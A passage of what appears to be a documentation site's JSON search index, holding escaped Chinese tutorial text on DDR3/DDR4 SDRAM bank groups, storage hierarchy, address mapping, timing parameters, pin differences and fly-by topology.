row\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u8981\u200b\u8bbf\u95ee\u200b\u4e0d\u540c\u200b Bank \u200b\u91cc\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b\u7b2c\u4e00\u4e2a\u200b Bank \u200b\u8fdb\u884c\u200b Activate/Precharge \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5176\u4ed6\u200b Bank \u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4ece\u800c\u200b\u63a9\u76d6\u200b row \u200b\u672a\u200b\u547d\u4e2d\u200b\u5e26\u6765\u200b\u7684\u200b\u6027\u80fd\u200b\u635f\u5931\u200b\u3002</p>"},{"location":"hardware/sdram.html#bank-group","title":"Bank Group","text":"<p>DDR4 \u200b\u76f8\u6bd4\u200b DDR3 \u200b\u5f15\u5165\u200b\u4e86\u200b Bank Group \u200b\u7684\u200b\u6982\u5ff5\u200b\u3002\u200b\u5f15\u7528\u200b \u200b\u540c\u4e00\u200b bank group page hit \u200b\u7684\u200b\u65f6\u95f4\u200b\u662f\u200b tccd_S \u200b\u8fd8\u662f\u200b tccd_L? - Ricky Li \u200b\u7684\u200b\u56de\u7b54\u200b - \u200b\u77e5\u4e4e\u200b \u200b\u548c\u200b DDR4 \u200b\u4e3a\u4f55\u200b\u4f1a\u200b\u5f15\u5165\u200b tCCD_L \u200b\u548c\u200b tCCD_S \u200b\u7684\u200b\u89c2\u70b9\u200b\uff1aDDR4 \u200b\u7684\u200b Memory array \u200b\u9891\u7387\u200b\u76f8\u6bd4\u200b DDR3 \u200b\u63d0\u9ad8\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b <code>I/O Gating</code> \u200b\u4e0a\u200b\uff0c\u200b\u5373\u4f7f\u200b\u547d\u4e2d\u200b\u4e86\u200b Row\uff0c\u200b\u5373\u200b\u4f7f\u7528\u200b\u4e86\u200b\u591a\u4e2a\u200b\u5c5e\u4e8e\u200b\u540c\u4e00\u4e2a\u200b <code>I/O Gating</code> \u200b\u7684\u200b Bank\uff0c\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u5b9e\u73b0\u200b\u5b8c\u7f8e\u200b\u7684\u200b\u8fde\u7eed\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5373\u200b\u4e24\u4e2a\u200b\u76f8\u90bb\u200b\u7684\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\u9694\u200b 5 \u200b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u800c\u200b\u6bcf\u6b21\u200b\u8bfb\u200b\u4f20\u8f93\u200b 4 \u200b\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5229\u7528\u7387\u200b\u6700\u9ad8\u200b 80%\uff0c\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> DDR4 \u200b\u7684\u200b\u975e\u200b\u8fde\u7eed\u200b\u8bfb\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-4D DDR4\uff09 <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u74f6\u9888\u200b\uff0cDDR4 \u200b\u5728\u200b\u6838\u5fc3\u200b\u90e8\u5206\u200b\u7684\u200b\u533a\u522b\u200b\u5c31\u662f\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b <code>Global I/O gating</code>\uff0c\u200b\u5e76\u4e14\u200b\u6bcf\u4e2a\u200b Bank Group \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b <code>I/O gating, DM mask logic</code>\uff0c\u200b\u4e0b\u9762\u200b\u5206\u522b\u200b\u753b\u51fa\u200b DDR3 \u200b\u548c\u200b DDR4 \u200b\u7684\u200b\u5b58\u50a8\u200b\u90e8\u5206\u200b\uff0c\u200b\u8fdb\u884c\u200b\u5bf9\u6bd4\u200b\uff1a</p> <p> </p> DDR3 SDRAM \u200b\u5b58\u50a8\u200b\u90e8\u5206\u200b\uff08\u200b\u56fe\u6e90\u200b Micron Datasheet\uff09 <p> </p> DDR4 SDRAM 512 Meg x 16 \u200b\u5b58\u50a8\u200b\u90e8\u5206\u200b\uff08\u200b\u56fe\u6e90\u200b Micron Datasheet\uff09 <p>\u200b\u6bcf\u4e2a\u200b Bank Group \u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b <code>I/O Gating</code> \u200b\u4ee5\u540e\u200b\uff0cDDR4 \u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u591a\u4e2a\u200b Bank Group \u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6d41\u6c34\u7ebf\u200b\u5f0f\u200b\u8f93\u51fa\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7b2c\u4e00\u4e2a\u200b Bank Group \u200b\u8bfb\u53d6\u200b\u4e86\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b I/O \u200b\u4e0a\u7528\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u4f20\u8f93\u200b\u5b8c\u200b\u6570\u636e\u200b\uff0c\u200b\u7acb\u9a6c\u200b\u7b2c\u4e8c\u4e2a\u200b Bank Group \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u5c31\u200b\u63a5\u4e0a\u200b\u4e86\u200b\uff0c\u200b\u53c8\u200b\u4f20\u8f93\u200b\u4e86\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\u56fe\u200b\uff1a</p> <p> </p> DDR4 \u200b\u4e0d\u540c\u200b Bank Group \u200b\u7684\u200b\u8fde\u7eed\u200b\u8bfb\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-4D DDR4\uff09 <p>\u200b\u4e0a\u56fe\u200b\u4e2d\u200b T0 \u200b\u65f6\u523b\u200b\u53d1\u8d77\u200b\u7b2c\u4e00\u4e2a\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0cT4 \u200b\u65f6\u523b\u200b\u53d1\u8d77\u200b\u7b2c\u4e8c\u4e2a\u200b\u8bf7\u6c42\u200b\uff0cT11-T15 \u200b\u5f97\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7d27\u63a5\u7740\u200b T15-T19 \u200b\u5f97\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u89e3\u51b3\u200b\u4e86\u200b\u9891\u7387\u200b\u63d0\u9ad8\u200b\u5e26\u6765\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"hardware/sdram.html#_6","title":"\u5b58\u50a8\u200b\u5c42\u6b21","text":"<p>\u200b\u4e0a\u9762\u200b\u5df2\u7ecf\u200b\u63d0\u5230\u200b\uff0c\u200b\u5728\u200b DDR SDRAM \u200b\u5185\u90e8\u200b\u7684\u200b\u5c42\u6b21\u200b\u4ece\u5927\u5230\u200b\u5c0f\u6709\u200b\uff1a</p> <ol> <li>Bank Group\uff1aDDR4 \u200b\u5f15\u5165\u200b\uff0c\u200b\u901a\u8fc7\u200b Bank Group \u200b\u63a9\u76d6\u200b DDR4 \u200b\u540c\u4e00\u4e2a\u200b Bank Group \u200b\u5185\u200b\u8fde\u7eed\u200b\u8bfb\u200b\u7684\u200b\u5ef6\u8fdf\u200b tCCD_L</li> <li>Bank\uff1a\u200b\u6bcf\u4e2a\u200b Bank \u200b\u540c\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Row \u200b\u88ab\u200b\u6fc0\u6d3b\u200b\uff0c\u200b\u901a\u8fc7\u200b\u591a\u4e2a\u200b Bank \u200b\u63a9\u76d6\u200b Activate/Precharge \u200b\u7684\u200b\u5ef6\u8fdf\u200b</li> <li>Row\uff1aActivate/Precharge \u200b\u7684\u200b\u5355\u4f4d\u200b</li> <li>Column\uff1a\u200b\u6bcf\u4e2a\u200b Column \u200b\u4fdd\u5b58\u200b n \u200b\u4e2a\u200b Cell\uff0cn \u200b\u662f\u200b SDRAM \u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b</li> <li>Cell\uff1a\u200b\u6bcf\u4e2a\u200b Cell \u200b\u4fdd\u5b58\u200b 1 bit \u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u5b9e\u9645\u4e0a\u200b\uff0cSDRAM \u200b\u5916\u90e8\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u5c42\u6b21\u200b\uff1a</p> <ol> <li>Channel\uff1a\u200b\u5904\u7406\u5668\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u901a\u9053\u200b\u6570\u91cf\u200b</li> <li>Module\uff1a\u200b\u5185\u5b58\u6761\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u5185\u5b58\u6761\u200b\u8fde\u63a5\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Channel \u200b\u4e0a\u200b</li> <li>Rank\uff1a\u200b\u591a\u4e2a\u200b DDR SDRAM \u200b\u82af\u7247\u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u8d77\u6765\u200b\uff0c\u200b\u4e00\u4e2a\u200b Module \u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u653e\u4e0b\u200b\u4e00\u5230\u200b\u56db\u4e2a\u200b Rank\uff0c\u200b\u8fd9\u4e9b\u200b Rank \u200b\u5171\u4eab\u200b\u603b\u7ebf\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Rank \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7247\u9009\u200b\u4fe1\u53f7\u200b CS_n\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u5728\u200b\u6df1\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b SDRAM \u200b\u82af\u7247\u200b</li> <li>Chip\uff1a\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b DDR SDRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b\u6570\u636e\u4f4d\u200b\u5bbd\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\u7684\u200b Rank\uff0c\u200b\u662f\u200b\u4f7f\u7528\u200b 8 \u200b\u4e2a\u200b x8 \u200b\u7684\u200b Chip \u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u800c\u6210\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u76f8\u90bb\u200b\u5b58\u50a8\u200b\u5c42\u6b21\u200b\u4e4b\u95f4\u200b\u90fd\u200b\u5dee\u200b\u4e00\u4e2a\u200b\u4e8c\u200b\u7684\u200b\u5e42\u6b21\u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4ece\u200b\u5185\u5b58\u5730\u5740\u200b\u5230\u200b\u8fd9\u4e9b\u200b\u5b58\u50a8\u200b\u5c42\u6b21\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u5c31\u662f\u200b\u622a\u53d6\u200b\u5730\u5740\u200b\u4e2d\u200b\u7684\u200b\u4e0d\u540c\u200b\u533a\u95f4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u533a\u95f4\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5c42\u6b21\u200b\u7684\u200b\u4e0b\u6807\u200b\u3002\u200b\u8fd9\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u5185\u5b58\u5927\u5c0f\u200b\u7684\u200b MB\u3001GB \u200b\u7528\u200b\u7684\u200b\u662f\u200b 1024 \u200b\u8fdb\u5236\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u7814\u7a76\u200b SDRAM \u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u6bd4\u5982\u200b Xilinx FPGA \u200b\u4e0a\u200b\u7684\u200b MIG\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u6620\u5c04\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>ROW_COLUMN_BANK</li> <li>ROW_BANK_COLUMN</li> <li>BANK_ROW_COLUMN</li> <li>ROW_COLUMN_LRANK_BANK</li> <li>ROW_LRANK_COLUMN_BANK</li> <li>ROW_COLUMN_BANK_INTLV</li> </ul> <p>\u200b\u5c31\u662f\u200b\u5c06\u200b\u5730\u5740\u200b\u7684\u200b\u4e0d\u540c\u200b\u90e8\u5206\u200b\u6620\u5c04\u200b\u5230\u200b DRAM \u200b\u7684\u200b\u51e0\u4e2a\u200b\u5730\u5740\u200b\uff1aRow\uff0cColumn\uff0cBank\u3002\u200b\u53ef\u4ee5\u200b\u60f3\u8c61\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u6620\u5c04\u200b\u65b9\u5f0f\u200b\u9488\u5bf9\u200b\u4e0d\u540c\u200b\u7684\u200b\u8bbf\u5b58\u200b\u6a21\u5f0f\u200b\u4f1a\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u8fde\u7eed\u200b\u7684\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\uff0cROW_COLUMN_BANK \u200b\u65b9\u5f0f\u200b\u662f\u200b\u6bd4\u8f83\u200b\u9002\u5408\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fde\u7eed\u200b\u7684\u200b\u8bbf\u95ee\u200b\u4f1a\u200b\u5206\u5e03\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b Bank \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u597d\u200b\u5730\u200b\u63a9\u76d6\u200b Activate/Precharge \u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u6027\u80fd\u200b\u5c31\u200b\u4f1a\u200b\u66f4\u597d\u200b\u3002</p>"},{"location":"hardware/sdram.html#_7","title":"\u65f6\u5e8f\u200b\u53c2\u6570","text":"<p>\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b DDR4 \u200b\u7684\u200b\u4e3b\u8981\u200b\u65f6\u5e8f\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li>tCCD_S: \u200b\u5bf9\u200b\u4e0d\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b CAS \u200b\u65f6\u200b\uff0cCAS \u200b\u5230\u200b CAS \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08CAS to CAS delay short\uff09\uff0c\u200b\u5982\u200b 4 \u200b\u5468\u671f\u200b</li> <li>tCCD_L: \u200b\u5bf9\u200b\u76f8\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b CAS \u200b\u65f6\u200b\uff0cCAS \u200b\u5230\u200b CAS \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08CAS to CAS delay long\uff09\uff0c\u200b\u5982\u200b 6 \u200b\u5468\u671f\u200b</li> <li>tRRD_S: \u200b\u5bf9\u200b\u4e0d\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b ACTIVATE \u200b\u65f6\u200b\uff0cACT \u200b\u5230\u200b ACT \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08ACT to ACT delay short\uff09\uff0c\u200b\u5982\u200b 4 \u200b\u5468\u671f\u200b</li> <li>tRRD_L: \u200b\u5bf9\u200b\u76f8\u540c\u200b Bank Group \u200b\u8fdb\u884c\u200b ACTIVATE \u200b\u65f6\u200b\uff0cACT \u200b\u5230\u200b ACT \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08ACT to ACT delay long\uff09\uff0c\u200b\u5982\u200b 6 \u200b\u5468\u671f\u200b</li> <li>tWTR_S\uff1a\u200b\u5bf9\u200b\u4e0d\u540c\u200b Bank Group \u200b\u5148\u200b WRITE \u200b\u540e\u200b READ \u200b\u65f6\u200b\uff0cWRITE \u200b\u5b8c\u6210\u200b\u5199\u5165\u200b\uff08\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\uff09\u200b\u5230\u200b READ \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08Write to Read short\uff09</li> <li>tWTR_L\uff1a\u200b\u5bf9\u200b\u76f8\u540c\u200b Bank Group \u200b\u5148\u200b WRITE \u200b\u540e\u200b READ \u200b\u65f6\u200b\uff0cWRITE \u200b\u5b8c\u6210\u200b\u5199\u5165\u200b\uff08\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\uff09\u200b\u5230\u200b READ \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08Write to Read long\uff09</li> <li>tREFI\uff1a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u9700\u8981\u200b\u6309\u7167\u200b tREFI \u200b\u7684\u200b\u95f4\u9694\u200b\u53d1\u9001\u200b REFRESH \u200b\u547d\u4ee4\u200b\uff08Refresh Interval\uff09</li> <li>tRFC\uff1a\u200b\u4e24\u6b21\u200b REFRESH \u200b\u547d\u4ee4\u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Refresh Cycle\uff09</li> <li>tFAW: \u200b\u5728\u200b\u8fde\u7eed\u200b\u7684\u200b FAW \u200b\u65f6\u95f4\u200b\u5185\u200b\uff0c\u200b\u6700\u200b\u591a\u200b\u53d1\u9001\u200b\u56db\u4e2a\u200b ACTIVATE \u200b\u547d\u4ee4\u200b\uff08Four Activate Window\uff09\uff0c\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0c\u200b\u7b2c\u200b i \u200b\u6b21\u200b ACTIVATE \u200b\u548c\u200b\u7b2c\u200b i+4 \u200b\u6b21\u200b ACTIVATE \u200b\u81f3\u5c11\u200b\u95f4\u9694\u200b tFAW \u200b\u65f6\u95f4\u200b</li> <li>tRP\uff1aPRECHARGE \u200b\u547d\u4ee4\u200b\u53d1\u9001\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5230\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u547d\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff08Precharge\uff09</li> <li>tRTP\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b READ \u200b\u5230\u200b PRE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Read to Precharge\uff09</li> <li>tRAS\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b ACT \u200b\u5230\u200b PRE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08RAS active time\uff0cActivate to Precharge\uff09</li> <li>tRCD\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b ACT \u200b\u5230\u200b READ/WRITE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Activate to Read/Write delay\uff09</li> <li>tRC\uff1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u7684\u200b ACT \u200b\u5230\u200b ACT/PRE \u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\uff08Activate to Activate/Precharge delay\uff09</li> <li>CL\uff1aCAS Latency\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b Read Latency</li> <li>CWL\uff1aCAS Write Latency\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b Write Latency</li> <li>AL\uff1aAdditive Latency\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b Read Latency</li> <li>RL\uff1aRead Latency</li> <li>WL\uff1aWrite Latency</li> </ul> <p>Additive Latency \u200b\u770b\u4f3c\u200b\u4eba\u4e3a\u200b\u589e\u52a0\u200b\u4e86\u200b\u547d\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e5f\u200b\u4f1a\u200b\u63d0\u524d\u200b AL \u200b\u4e2a\u200b\u5468\u671f\u200b\u53bb\u200b\u53d1\u9001\u200b\u547d\u4ee4\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8bbe\u7f6e\u200b AL \u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fde\u7eed\u200b\u53d1\u9001\u200b ACT \u200b\u548c\u200b READ \u200b\u547d\u4ee4\u200b\uff0c\u200b\u901a\u8fc7\u200b AL \u200b\u4f7f\u5f97\u200b READ \u200b\u547d\u4ee4\u200b\u5ef6\u8fdf\u200b\u751f\u6548\u200b\uff0c\u200b\u4ee5\u200b\u6ee1\u8db3\u200b tRCD \u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\uff0c\u200b\u540c\u65f6\u200b\u547d\u4ee4\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7a7a\u95f2\u200b\u4e86\u200b\u51fa\u6765\u200b\u3002</p>"},{"location":"hardware/sdram.html#_8","title":"\u63a5\u53e3","text":"<p>\u200b\u4e0b\u9762\u200b\u753b\u51fa\u200b\u4e86\u200b DDR3 \u200b\u548c\u200b DDR4 \u200b\u7684\u200b\u5f15\u811a\u200b\uff1a</p> <p> </p> DDR3 \u200b\u548c\u200b DDR4 \u200b\u539f\u7406\u56fe\u200b <p>DDR3 \u200b\u548c\u200b DDR4 \u200b\u7684\u200b\u4e0d\u540c\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\uff1aDDR3 \u200b\u662f\u200b A0-A14\uff0cDDR4 \u200b\u662f\u200b A0-A17\uff0c\u200b\u5176\u4e2d\u200b A14-A16 \u200b\u590d\u7528\u200b\u4e86\u200b\u5f15\u811a\u200b</li> <li>DDR4 \u200b\u5f15\u5165\u200b\u4e86\u200b Bank Group\uff0c\u200b\u6240\u4ee5\u200b\u591a\u51fa\u200b\u4e86\u200b BG0-BG1 \u200b\u5f15\u811a\u200b\u4f5c\u4e3a\u200b Bank Group \u200b\u5730\u5740\u200b</li> <li>DDR4 \u200b\u5f15\u5165\u200b\u4e86\u200b Bank Group \u200b\u540e\u200b\uff0c\u200b\u603b\u200b Bank \u200b\u6570\u91cf\u200b\u662f\u200b \\(4*4=16\\)\uff1bDDR3 \u200b\u7684\u200b Bank \u200b\u6570\u91cf\u200b\u662f\u200b 8</li> <li>DDR3 \u200b\u4e2d\u200b\u7684\u200b RAS_n\u3001CAS_n \u200b\u548c\u200b WE_n \u200b\u5728\u200b DDR4 \u200b\u4e2d\u200b\u88ab\u200b\u590d\u7528\u200b\u4e3a\u4e86\u200b A14-A16\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u5bb9\u91cf\u200b</li> <li>DDR4 \u200b\u989d\u5916\u200b\u6dfb\u52a0\u200b\u4e86\u200b ACT_n \u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b</li> </ol>"},{"location":"hardware/sdram.html#_9","title":"\u62d3\u6251","text":"<p>\u200b\u4e3a\u4e86\u200b\u83b7\u5f97\u200b\u66f4\u5927\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\uff0c\u200b\u5728\u200b\u5185\u5b58\u6761\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5f88\u591a\u200b\u4e2a\u200b SDRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u901a\u8fc7\u200b\u5bbd\u5ea6\u200b\u62fc\u63a5\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5f62\u6210\u200b\u4e00\u4e2a\u200b 64 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u5bbd\u5ea6\u200b\u3002\u200b\u6b64\u65f6\u200b\u4ece\u200b PCB \u200b\u8d70\u7ebf\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u8bb2\u200b\uff0c\u200b\u6570\u636e\u7ebf\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u5230\u200b\u5404\u4e2a\u200b SDRAM \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f8\u5bf9\u200b\u5bb9\u6613\u200b\u5730\u200b\u8fde\u63a5\u200b\uff1b\u200b\u4f46\u662f\u200b\u5176\u4ed6\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u9700\u8981\u200b\u8fde\u63a5\u200b\u5230\u200b\u6240\u6709\u200b SDRAM \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u5728\u200b\u5c40\u9650\u200b\u7684\u200b\u7a7a\u95f4\u200b\u91cc\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u5230\u200b\u5404\u4e2a\u200b SDRAM \u200b\u82af\u7247\u200b\u7684\u200b\u8ddd\u79bb\u200b\u76f8\u7b49\u200b\uff0c\u200b\u540c\u65f6\u200b\u4fdd\u8bc1\u200b\u4fe1\u53f7\u200b\u5b8c\u6574\u6027\u200b\u662f\u200b\u5f88\u200b\u56f0\u96be\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/sdram.html#fly-by-topology","title":"Fly-by topology","text":"<p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5730\u5740\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\u662f\u200b\u91c7\u7528\u200b\u4e86\u200b\u4e32\u8054\u200b\u7684\u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\uff08Fly-by topology\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0b\u56fe\u200b\u7684\u200b\u53f3\u8fb9\u200b\u7684\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\uff1a</p> <p> </p> SDRAM \u200b\u7684\u200b\u4e24\u79cd\u200b\u4fe1\u53f7\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b Versal ACAP PCB Design User Guide (UG863)\uff09 <p>\u200b\u4f46\u662f\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff08DQ\u3001DQS \u200b\u548c\u200b DM\uff09\u200b\u4f9d\u7136\u200b\u662f\u200b\u5e76\u884c\u200b\u70b9\u5bf9\u70b9\u200b\u8fde\u63a5\u200b\u5230\u200b SDRAM \u200b\u4e0a\u200b\u7684\u200b\uff08\u200b\u4e0a\u200b\u56fe\u200b\u5de6\u4fa7\u200b\uff09\u3002\u200b\u8fd9\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u95ee\u9898\u200b\uff1a\u200b\u4e0d\u540c\u200b\u7684\u200b SDRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u6570\u636e\u200b\u548c\u200b\u65f6\u949f\u200b\u7684\u200b\u504f\u5dee\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6570\u636e\u200b\u53ef\u80fd\u200b\u5dee\u4e0d\u591a\u200b\u65f6\u95f4\u200b\u5230\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u949f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u8d8a\u6765\u8d8a\u200b\u5927\u200b\uff1a</p> <p> </p> SDRAM \u200b\u7684\u200b\u65f6\u949f\u200b\u504f\u79fb\u200b\u95ee\u9898\u200b <p>\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u5904\u4e8e\u200b\u4e0d\u540c\u200b\u4f4d\u7f6e\u200b\u7684\u200b SDRAM 